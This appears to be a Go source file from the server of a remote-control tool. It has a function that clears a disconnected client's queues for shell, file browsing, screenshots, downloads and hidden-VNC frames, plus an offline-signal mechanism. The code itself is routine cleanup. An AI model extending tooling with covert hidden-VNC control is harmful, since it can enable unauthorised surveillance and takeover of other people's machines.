package command

import "sync"

// CleanupClientQueues 客户端断线/离线时清理其全部内存队列与状态，
// 防止 uid 级 map 随历史客户端单向膨胀（内存泄漏）。
//
// 只删除 map 条目、不 close 通道：通道可能仍被并发消费者引用，
// close 后消费者发来的数据会触发 "send on closed channel" panic。
// 无消费者持有的通道由 GC 回收。
func CleanupClientQueues(uid string) {
	CommandQueues.DeleteClient(uid)
	VarShellQueue.Remove(uid)
	VarPidQueue.Remove(uid)
	VarDrivesQueue.Remove(uid)
	VarFileBrowserQueue.Remove(uid)
	VarScreenshotQueue.RemoveEntries(uid)
	VarFileEditQueue.CleanupQueues(uid)
	VarFileOpQueue.RemoveAllEntries(uid)
	VarHVNCFrameQueue.RemoveByUid(uid)
	VarMonitorFrameQueue.RemoveEntries(uid)
	VarDownloadFiles.CleanupAll(uid)
	ClearUidFileBrowser(uid)
	ClearExecClientCapability(uid)

	// I1: 广播离线信号（等待客户端响应的 handler 提前返回，避免白等满超时）
	// 原为死代码：map 中 channel 只增不减 → 内存泄漏；handler 全部空等到超时
	SignalClientOffline(uid)
}

// clientOfflineSignals 客户端离线通知：等待客户端响应的 handler 可订阅，
// 断线清理时收到信号提前返回（避免白等满超时）。
var clientOfflineSignals struct {
	mu sync.Mutex
	m  map[string]chan struct{}
}

func init() {
	clientOfflineSignals.m = make(map[string]chan struct{})
}

// GetClientOfflineSignal 获取指定 UID 的离线信号通道（懒创建）
func GetClientOfflineSignal(uid string) <-chan struct{} {
	clientOfflineSignals.mu.Lock()
	defer clientOfflineSignals.mu.Unlock()
	if ch, ok := clientOfflineSignals.m[uid]; ok {
		return ch
	}
	ch := make(chan struct{})
	clientOfflineSignals.m[uid] = ch
	return ch
}

// SignalClientOffline 广播客户端离线（close 通道，等待方收到后自行返回；下次订阅自动重建）
func SignalClientOffline(uid string) {
	clientOfflineSignals.mu.Lock()
	defer clientOfflineSignals.mu.Unlock()
	if ch, ok := clientOfflineSignals.m[uid]; ok {
		close(ch)
		delete(clientOfflineSignals.m, uid)
	}
}
